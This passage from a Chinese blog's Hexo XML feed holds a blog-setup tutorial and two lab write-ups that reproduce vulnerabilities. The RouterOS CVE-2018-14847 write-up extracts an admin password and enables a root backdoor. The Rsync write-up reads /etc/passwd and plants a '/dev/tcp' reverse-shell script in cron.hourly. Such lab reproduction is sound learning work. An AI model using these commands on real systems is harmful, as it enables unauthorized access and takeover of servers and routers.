src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(15).png"></p><p>然后<code>ssh -T git@github.com</code>验证是否成功。出现“Hi UserName”字样即为成功。这里我踩了坑，如果用户名和你的电脑名一样的话，SSH无法正常使用，必须要修改一下主机名。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(16).png"></p><h3 id="3-4-3-将博客上传到Github"><a href="#3-4-3-将博客上传到Github" class="headerlink" title="3.4.3 将博客上传到Github"></a>3.4.3 将博客上传到Github</h3><p>在hexo文件夹下打开终端，输入以下命令安装git部署插件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-deployer-git --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>中间可能会出现一些Warning，不必理会，只要最后成功安装了就行。然后打开_config.yml，在结尾找到deploy修改为如下（注意，每个冒号后面都必须跟一个空格，否则会出错）：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">deploy:  type: git  repo:     github: https://github.com/qiacu/qiacu.github.io  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改好后，就可以使用<code>hexo g</code>和<code>hexo d</code>命令来将我们写的博客部署到github上面了。建议每次重新部署时按照一下步骤：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo cleanhexo ghexo d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>输出如下：</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(17).png"></p><p>去Githu查看：</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(18).png"></p><p>部署成功，访问<a target="_blank" rel="noopener" href="http://username.github,io即可查看网页.如果用的是gitee,还需要手动更新一下才能正常访问(之后每次修改后也都需要手动更新)./">http://UserName.github,io即可查看网页。如果用的是Gitee，还需要手动更新一下才能正常访问（之后每次修改后也都需要手动更新）。</a></p><p>剩下的就是简单修改一些_config.yml里面的东西，具体可以参考<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/configuration">官方文档</a>，这里不再详述。顺便说一句，对于新手来说，最好的教程就是官方文档。</p><h1 id="4-提升博客的逼格"><a href="#4-提升博客的逼格" class="headerlink" title="4 提升博客的逼格"></a>4 提升博客的逼格</h1><h2 id="4-1-绑定域名"><a href="#4-1-绑定域名" class="headerlink" title="4.1 绑定域名"></a>4.1 绑定域名</h2><p>是否绑定域名由你自己选择，不是必须的。</p><h3 id="4-1-1-申请域名"><a href="#4-1-1-申请域名" class="headerlink" title="4.1.1 申请域名"></a>4.1.1 申请域名</h3><p>可以申请域名的平台有很多，我这里选择的是腾讯云。进入腾讯云官网，搜索关键词<strong>域名</strong>，点击域名注册。输入自己想要申请的域名查询是否被注册（图中最下面那个cn的已经被我注册了）。选中自己想要注册的域名，加入购物车后购买即可。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(19).png"></p><h3 id="4-1-2-域名解析"><a href="#4-1-2-域名解析" class="headerlink" title="4.1.2 域名解析"></a>4.1.2 域名解析</h3><p>购买成功后，进入域名管理控制台，此时在服务状态一栏你的显示可能是正在审核，一般几个小时后就可以正常了。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(20).png"></p><p>点击解析，添加两条记录：</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(21).png"></p><h3 id="4-1-3-域名绑定"><a href="#4-1-3-域名绑定" class="headerlink" title="4.1.3 域名绑定"></a>4.1.3 域名绑定</h3><p>打开Github的hexo项目，点击settings，拉到最下面的Custom domain处，填写上自己的域名，保存。（记得勾选HTTPS，否则后面打开你的网站会提示不安全）</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(22).png"></p><p>成功后，在本地hexo根目录下进入source，创建一个名为CNAME的文件，使用记事本写入你的域名，保存即可。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(23).png"></p><h3 id="4-1-4-配置SSL证书"><a href="#4-1-4-配置SSL证书" class="headerlink" title="4.1.4 配置SSL证书"></a>4.1.4 配置SSL证书</h3><p>进入SSL证书管理，点击提交资料。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(24).png"></p><p>跟着提示，一步步走下去，有哪里不懂的地方直接点进附近的链接查看文档。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(25).png"></p><h2 id="4-2-SEO优化"><a href="#4-2-SEO优化" class="headerlink" title="4.2 SEO优化"></a>4.2 SEO优化</h2><p>如果没有任何配置，那么自己写的博客可能很难被百度、谷歌等搜索引擎搜到，因此需要我们将网站提交给百度和谷歌。</p><p>首先我们需要安装两个hexo插件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-generator-sitemap --save<span class="token function">npm</span> <span class="token function">install</span> hexo-generator-baidu-sitemap --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>打开hexo根目录配置文件，写入以下内容：</p><pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token key atrule">sitemap</span><span class="token punctuation">:</span><span class="token key atrule">path</span><span class="token punctuation">:</span> sitemap.xml<span class="token key atrule">baidusitemap</span><span class="token punctuation">:</span><span class="token key atrule">path</span><span class="token punctuation">:</span> baidusitemap.xml<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重启 hexo，本地访问 <a target="_blank" rel="noopener" href="https://shen-yu.gitee.io/2020/hexo-seo/">localhost:4000/sitemap.xml</a>和 <a target="_blank" rel="noopener" href="https://shen-yu.gitee.io/2020/hexo-seo/">localhost:4000/baidusitemap.xml</a>，就能正确的展示出两个sitemap 文件了。</p><h3 id="4-2-1-提交百度"><a href="#4-2-1-提交百度" class="headerlink" title="4.2.1 提交百度"></a>4.2.1 提交百度</h3><p>进入<a target="_blank" rel="noopener" href="https://ziyuan.baidu.com/site/siteadd?siteurl=#/">百度站点管理</a>，添加自己的网站。验证方式我选择的是添加html标签。</p><p>然后手动提交baidusitemap.xml。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(30).png"></p><p>在“抓取诊断”中手动抓取，然后Robots-&gt;检测并更新。</p><h3 id="4-2-2-提交谷歌"><a href="#4-2-2-提交谷歌" class="headerlink" title="4.2.2 提交谷歌"></a>4.2.2 提交谷歌</h3><p><a target="_blank" rel="noopener" href="https://search.google.com/search-console">GoogleSearchConsole</a> → 站点地图 → 输入sitemap.xml → 提交。</p><h2 id="4-3-打造免费图床"><a href="#4-3-打造免费图床" class="headerlink" title="4.3 打造免费图床"></a>4.3 打造免费图床</h2><p>图片存储是写博客的一个大问题，如果只是本地浏览markdown文档，那么图片存在本地即可，可是要发布到网上，那么就要使用图床了。可是很多正规的图床都需要付费，而且构建也比较麻烦，这就让我们很头疼。我最开始使用过聚合图床，但是免费版有限制，有时候也会出现问题，而且安全性也无法保证。所以一个好的图床对我们来说是十分重要的。</p><p>在这里，本醋将使用Github+jsDelivr+PicGo+Imagine来构造一个快速、免费的图床。</p><h3 id="4-3-1-Github生成token"><a href="#4-3-1-Github生成token" class="headerlink" title="4.3.1 Github生成token"></a>4.3.1 Github生成token</h3><p>新建一个Github仓库，名字随意，权限设置为public。然后点击用户头像进入Settings-&gt;Developer settings-&gt;Personal access tokens-&gt;Generate new token（右上角那个，而不是文中的链接）。note中输入备注，什么都可以，然后勾选repo。之后拉到最下面，generate token。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(35).png"></p><p>然后，会生成Token密钥，这个页面只会出现一次，所以最好把这个密钥记下来，一会儿要用。</p><h3 id="4-3-2-配置PicGo并用jsdelivr作为CDN加速"><a href="#4-3-2-配置PicGo并用jsdelivr作为CDN加速" class="headerlink" title="4.3.2 配置PicGo并用jsdelivr作为CDN加速"></a>4.3.2 配置PicGo并用jsdelivr作为CDN加速</h3><p>前往下载<a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/PicGo">PicGo</a>，安装过程没什么好说的。</p><p>安装好之后打开，开始配置图床：图床设置-&gt;GitHub图床。</p><ul><li>设定仓库名：用户名/图床仓库名</li><li>设定分支名：master</li><li>设定Token：刚才的密钥</li><li>指定存储路径：填写想要储存的路径，如img/，这样就会在仓库下创建一个名为img的文件夹，图片都会存储在此处</li><li>设定自定义域名：<code>https://cdn.jsdelivr.net/gh/用户名/图床仓库名</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(36).png"></p><h3 id="4-3-3-使用Imagine进行图片压缩（可选）"><a href="#4-3-3-使用Imagine进行图片压缩（可选）" class="headerlink" title="4.3.3 使用Imagine进行图片压缩（可选）"></a>4.3.3 使用Imagine进行图片压缩（可选）</h3><p>有时候，我们截取的图片都是比较大的，或者一篇博客中包含的图片比较多，这样网页加载就会比较慢。这时候我们可以使用<a target="_blank" rel="noopener" href="https://github.com/meowtec/Imagine/releases">Imagine</a>对图片进行<strong>有损</strong>压缩。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(37).png"></p><h3 id="4-3-4-上传图片到PicGo并使用图床"><a href="#4-3-4-上传图片到PicGo并使用图床" class="headerlink" title="4.3.4 上传图片到PicGo并使用图床"></a>4.3.4 上传图片到PicGo并使用图床</h3><p>将Imagine压缩后的图片拖到PicGo的上传去，将会自动上传并复制访问链接，将链接粘贴到markdown文档中即可。</p><h3 id="4-3-5-发现的问题"><a href="#4-3-5-发现的问题" class="headerlink" title="4.3.5 发现的问题"></a>4.3.5 发现的问题</h3><p><strong>在CSDN中用markdown语法引用这些图片，有时候会失效？</strong></p><p>解决方法：使用HTML插入图片即可。</p><h2 id="4-4-添加天气"><a href="#4-4-添加天气" class="headerlink" title="4.4 添加天气"></a>4.4 添加天气</h2><p>访问<a target="_blank" rel="noopener" href="https://cj.weather.com.cn/">中国天气官网</a>，点击自定义插件，推荐选择网页简约插件。创建后会有很多选项让你选择，十分详细，自己看着设置就好。设置好之后点击生成代码，将生成的代码复制到matery主题文件夹下的layout/about.ejs文件中，放在代码中不同的位置，最后在网页中显示的位置也不一样，可以自己摸索着来。</p><h2 id="4-5-添加樱花雨效果"><a href="#4-5-添加樱花雨效果" class="headerlink" title="4.5 添加樱花雨效果"></a>4.5 添加樱花雨效果</h2><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/image-20210219001006276.png"></p><p>想象一下上面的樱花在不断下落~~</p><p>首先在主题目录下的/source/js下创建文件sakura.js，将该<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/Yafine/cdn@3.2.7/source/js/sakura.js">网址</a>里面的内容复制进去即可。</p><p>然后在/layout/layout.ejs中添加以下内容：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script type<span class="token operator">=</span><span class="token string">"text/javascript"</span><span class="token operator">&gt;</span><span class="token comment">//只在桌面版网页启用特效</span><span class="token keyword">var</span> windowWidth <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span>window<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">width</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>windowWidth <span class="token operator">&gt;</span> <span class="token number">768</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    document<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span><span class="token string">'&lt;script type="text/javascript" src="/js/sakura.js"&gt;&lt;\/script&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="5-主题相关配置"><a href="#5-主题相关配置" class="headerlink" title="5 主题相关配置"></a>5 主题相关配置</h1><p>该部分内容可能与你使用的主题有关，如果你使用的主题不支持，那么可能还需要你自己按照各个插件的官方文档一步步配置。以下内容均是以Matery主题为基础展开的。</p><h2 id="4-1-Twikoo评论设置"><a href="#4-1-Twikoo评论设置" class="headerlink" title="4.1 Twikoo评论设置"></a>4.1 Twikoo评论设置</h2><p>我最初是想要使用Valine或者MiniValine来做评论系统的，但是不知道什么原因，在本地端口打开网页测试评论功能时一切正常，一旦部署到github pages后就失效了，无法正常访问leancloud。我不想太过麻烦，所以直接使用了twikoo评论系统。我使用的主题Matery也支持twikoo。</p><p>注意：Twikoo<strong>不兼容IE</strong>（但兼容Edge），介意的小伙伴勿选。</p><p>以下是我的配置过程，也可以参考<a target="_blank" rel="noopener" href="https://twikoo.js.org/quick-start.html">官方文档</a>。</p><h3 id="4-1-1-手动部署"><a href="#4-1-1-手动部署" class="headerlink" title="4.1.1 手动部署"></a>4.1.1 手动部署</h3><p>进入腾讯云<a target="_blank" rel="noopener" href="https://cloud.tencent.com/act/pro/cloudbase01#4">CloudBase</a>，下拉到新用户专享部分，选择免费的基础版1即可（有钱的话当我没说），然后按照提示一步步购买。</p><p>购买成功后，进入环境-&gt;登录授权，开启匿名登陆。然后点击“自定义登录”一行中的“私钥下载”，下载该文件，一会儿要用。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(26).png"></p><p>进入环境-&gt;安全配置，将网站域名加入到“WEB安全域名”。如“qiacuhome.cn”。</p><p>进入云函数界面，新建云函数，函数名称填写twikoo，创建方式选空白函数，运行环境选Nodejs 10.15，函数内存选128MB，然后进入下一步。之后会看到一个输入框，清空里面的内容，填写以下代码：</p><pre class="line-numbers language-js" data-language="js"><code class="language-js">exports<span class="token punctuation">.</span>main <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'twikoo-func'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>创建完成后，点击“twikoo”进入云函数详情页，进入“函数代码”标签，新建文件，文件名为package.json，填写以下代码，点击<strong>保存并安装依赖</strong>。</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"twikoo-func"</span><span class="token operator">:</span> <span class="token string">"1.2.0"</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-1-2-管理面板配置"><a href="#4-1-2-管理面板配置" class="headerlink" title="4.1.2 管理面板配置"></a>4.1.2 管理面板配置</h3><p>在环境-&gt;资源购买页面可以找到自己的环境ID，复制后填入Matery主题的_config.yml文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(27).png"></p><p>然后重新<code>hexo g -d</code>，部署github pages。完成后，进入自己的网站，随便找到一个有评论框的页面进入，在右下角有一个设置，点进入，输入刚才下载的私钥，就可以进入管理界面了。按照提示修改配置即可。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(28).png"></p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(29).png"></p><h2 id="4-2-哔哔功能"><a href="#4-2-哔哔功能" class="headerlink" title="4.2 哔哔功能"></a>4.2 哔哔功能</h2><p>Matery主题支持哔哔功能（类似说说，但是不能评论，artitalk可以评论，但是在matery中它不是单独页面，我懒得去改就没用）。</p><h3 id="4-2-1-创建LeanCloud应用"><a href="#4-2-1-创建LeanCloud应用" class="headerlink" title="4.2.1 创建LeanCloud应用"></a>4.2.1 创建LeanCloud应用</h3><p>必须使用<a target="_blank" rel="noopener" href="https://console.leancloud.app/apps">LeanCloud国际版</a>。国际版和国内版就速度而言没有什么差异。然后点击左上角的创建应用，名字随意。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(31).png"></p><p>然后新建一个class，名字为content。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(32).png"></p><p>然后点击content这个class，添加列，名字为content，列类型为String，列注释随便写点什么就行。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(33).png"></p><h3 id="4-2-2-创建哔哔页面"><a href="#4-2-2-创建哔哔页面" class="headerlink" title="4.2.2 创建哔哔页面"></a>4.2.2 创建哔哔页面</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hexo new page bb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在pathtohexo/source/bb/下找到index.md，至少写入以下内容：</p><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">title: 恰醋说layout: bb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="4-2-3-关注公众号"><a href="#4-2-3-关注公众号" class="headerlink" title="4.2.3 关注公众号"></a>4.2.3 关注公众号</h3><p>微信搜索公众号<strong>黑石哔哔</strong>，关注后发送<code>//leancloud:appid,masterkey,restapi</code>即可绑定到leancloud，之后当你想要发什么说说时，只要发送给这个公众号即可。</p><p>其中，appid, masterkey获得方式如下图所示，restapi为<code>https://appid前八位.api.lncldglobal.com</code>。</p><p><img src="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuhexoblogbuild%20(34).png"></p><p>最后别忘记修改主题配置文件。</p>]]></content>
      
      
      <categories>
          
          <category> 写作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>友链互换说明</title>
      <link href="2021/02/13/you-lian-shen-qing-shuo-ming/"/>
      <url>2021/02/13/you-lian-shen-qing-shuo-ming/</url>
      
        <content type="html"><![CDATA[<p>现在是2021年2月13日，农历正月初二，本醋刚刚把整个博客从<a target="_blank" rel="noopener" href="https://github.com/Shen-Yu/hexo-theme-ayer">Ayer</a>主题迁移为<a target="_blank" rel="noopener" href="https://github.com/blinkfox/hexo-theme-matery/tree/master">Matery</a>主题，而且申请了自己的域名，准备一切重新开始…</p><p>虽然现在恰醋的小屋还只是刚刚建立（就算是刚刚建立吧，以前只是一个无情的写博客机器，从来没想过好好搞），没有多少访问量，但是我会坚持写下去的！所以请你们千万不要嫌弃我！</p><p>申请友链的话，请在留言板留言，或者直接评论在本文下面，格式如下：</p><blockquote><ul><li>网站头像：</li><li>网站名称：</li><li>网站描述：</li><li>博客地址：</li><li>网站标题：可选，默认为”访问主页“</li></ul></blockquote><p>下面是我的网站信息：</p><blockquote><ul><li>网站头像：<a target="_blank" rel="noopener" href="https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuavathhh.jpg">https://cdn.jsdelivr.net/gh/qiacu/blog-imgs/img/qiacuavathhh.jpg</a></li><li>网站名称：恰醋的小屋</li><li>网站描述：HIT网络空间安全专业乖乖吃饭比赛蝉联冠军得主</li><li>网站地址：<a href="https://qiacuhome.cn/">https://qiacuhome.cn/</a></li><li>网站标题：速去干饭</li></ul></blockquote><p>如果有哪里不太清楚，可以去友链页面看一哈~</p><p>我知道我现在还很菜，写的内容可能也没多大营养，不过可以保证都是原创！而且那些漏洞复现也都是自己认认真真做过后才写的！</p><p>想要互换友链的小伙伴，我保证会不定时去看你们的主页的，如果有我感兴趣的内容也会认真阅读并评论！</p><p>不过希望小伙伴你是认真在写博客，可能和我一样水平不高，只能写一些很简单的东西，但只要认真在写就好！因为我们都还年轻呢，有很大的成长空间~</p><p>愿您有一个灿烂的前程！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-14847 RouterOS漏洞复现</title>
      <link href="2021/01/25/cve-2018-14847/"/>
      <url>2021/01/25/cve-2018-14847/</url>
      
        <content type="html"><![CDATA[<p>RouterOS存在目录穿越、任意文件读写漏洞。ked_check_path函数采用类似状态机的方式有限制的允许“..”字符串，不允许穿越到父目录中，但函数中没有对“.”进行验证，所以可以构造“/./..”的payload来进入父目录，从而实现目录穿越。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>攻击机：kali</p><p>靶机：RouterOS 6.41.3 </p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>下载安装合适版本RouterOS的iso文件（或ova文件），导入虚拟机，我用的是ova文件，还需要修改一下兼容性。启动后，输入默认用户名和密码（用户名admin，密码为空）。然后配置IP。RouterOS不可以使用linux的常用命令，必须要使用自带的命令进行操作。TAB可以补全命令或查看可使用的命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">ip</span> address<span class="token operator">&gt;</span> print     <span class="token comment"># 显示当前IP</span><span class="token operator">&gt;</span> remove <span class="token assign-left variable">number</span><span class="token operator">=</span><span class="token number">0</span>     <span class="token comment"># 移除当前IP</span><span class="token operator">&gt;</span> <span class="token function">add</span> <span class="token assign-left variable">address</span><span class="token operator">=</span>Your IP/24 <span class="token assign-left variable">interface</span><span class="token operator">=</span>ether1     <span class="token comment"># 添加IP地址</span><span class="token operator">&gt;</span> <span class="token punctuation">..</span>     <span class="token comment"># 返回上一级目录</span><span class="token operator">&gt;</span> <span class="token punctuation">..</span><span class="token operator">&gt;</span> system <span class="token function">reboot</span>     <span class="token comment"># 重启</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动ssh, www, telnet等功能。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> <span class="token function">ip</span> <span class="token function">service</span><span class="token operator">&gt;</span> enbale <span class="token function">ssh</span><span class="token operator">&gt;</span> <span class="token builtin class-name">enable</span> telnet<span class="token operator">&gt;</span> <span class="token builtin class-name">enable</span> winbox<span class="token operator">&gt;</span> enbale www<span class="token operator">&gt;</span> print<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在移除IP后，需要在Kali端尝试能不能ping通。如果配置成功，浏览器访问设置的IP则可以直接进入到这个界面：</p><p>为了后续漏洞复现能够正常进行，必须要保证admin用户有密码。如果没有密码，需要设置。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>下载<a target="_blank" rel="noopener" href="https://github.com/tenable/routeros/tree/master/poc/cve_2018_14847">POC</a>，然后按照README文档配置环境。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">apt</span> <span class="token function">install</span> libboost-all-dev cmake$ <span class="token builtin class-name">cd</span> routeros-master/poc/cve_2018_14847$ <span class="token function">mkdir</span> build$ cmake <span class="token punctuation">..</span>$ <span class="token function">make</span>$ ./cve_2018_14847_poc --ip <span class="token number">192.168</span>.227.181 --port <span class="token number">8291</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个是针对CVE-2018-14847目录穿越漏洞的POC，接下来使用另一个POC，位于当前poc的上层目录中的bytheway文件。这个poc可以利用RouterOS上的启用root shell的漏洞。该漏洞首先利用CVE-2018-14847提取管理员密码，然后创建一个选项包来启用开发者后门。攻击者可以使用root用户devel和admin的密码通过SSH或Telnet连接RouterOS。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">mkdir</span> build$ <span class="token builtin class-name">cd</span> build$ cmake <span class="token punctuation">..</span>$ <span class="token function">make</span>$ ./btw -i <span class="token number">192.168</span>.227.181$ telnet -l devel <span class="token number">192.168</span>.227.181<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上图可以看到，成功获取了admin用户的密码：123456，并创建了devel用户。之后就可以使用telnet来登录devel，并进行各种操作了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意文件读写 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rsync未授权漏洞复现</title>
      <link href="2020/12/29/rsync-wei-shou-quan-lou-dong-fu-xian/"/>
      <url>2020/12/29/rsync-wei-shou-quan-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>Rsync是Linux下一款数据备份工具，它在同步文件的同时，可以保持原来文件的权限、时间、软硬链接等附加信息。同时支持通过rsync协议、ssh协议进行远程文件传输，常被用于在内网进行源代码的分发及同步更新，因此使用人群多为开发人员。其中rsync协议默认监听873端口。如果目标开启了rsync服务，并且没有配置ACL或访问密码，而rsync默认是root权限，我们将可以读写目标服务器文件。</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>Kali，docker</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub">vulhub</a>项目。下载到kali后，进入rsync/common目录下，启动docker。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ docker-compose build$ docker-compose run -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>使用nmap扫描，873端口开启，环境搭建成功。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="查看模块名列表及src模块"><a href="#查看模块名列表及src模块" class="headerlink" title="查看模块名列表及src模块"></a>查看模块名列表及src模块</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rsync</span> rsync://IP:873/<span class="token function">rsync</span> rsync://IP:873/src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="任意文件下载"><a href="#任意文件下载" class="headerlink" title="任意文件下载"></a>任意文件下载</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sync</span> -av rsync://IP/src/etc/passwd /root/passwd.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rsync</span> <span class="token number">1</span>.txt rsync://IP/src/home/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>首先下载rsync的任务计划文件，该文件名为/src/etc/crontab。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sync</span> -av rsync://IP/src/etc/crontab ./crontab.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载完成后，查看，发现在每小时的第17分钟都会执行<code>cd / &amp;&amp; run-parts --report /etc/cron.hourly</code>命令。</p><p>如果当前离这个时间点近的话可以直接继续，不然的话可以选择进入该docker，修改crontab文件，将17改为自己想要的值。或者将下载下来的crontab.txt改名为crontab，然后上传到原位置。</p><p>构造shell并赋予执行权限。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> shell<span class="token comment">#写入以下两行内容</span><span class="token comment">#!/bin/bash </span>/bin/bash -i <span class="token operator">&gt;&amp;</span> /dev/tcp/IP<span class="token punctuation">(</span>修改<span class="token punctuation">)</span>/4444 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>$ <span class="token function">chmod</span> +x shell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将shell上传至/etc/cron.hourly。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">rsync</span> -av shell rsync://IP/src/etc/cron.hourly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上传成功后，用nc监听对应的端口（4444），等待到达指定的时间，即可接收到反弹shell。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意文件读取 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>禅道全版本漏洞复现</title>
      <link href="2020/12/26/shan-dao-quan-ban-ben-lou-dong-fu-xian/"/>
      <url>2020/12/26/shan-dao-quan-ban-ben-lou-dong-fu-xian/</url>
      
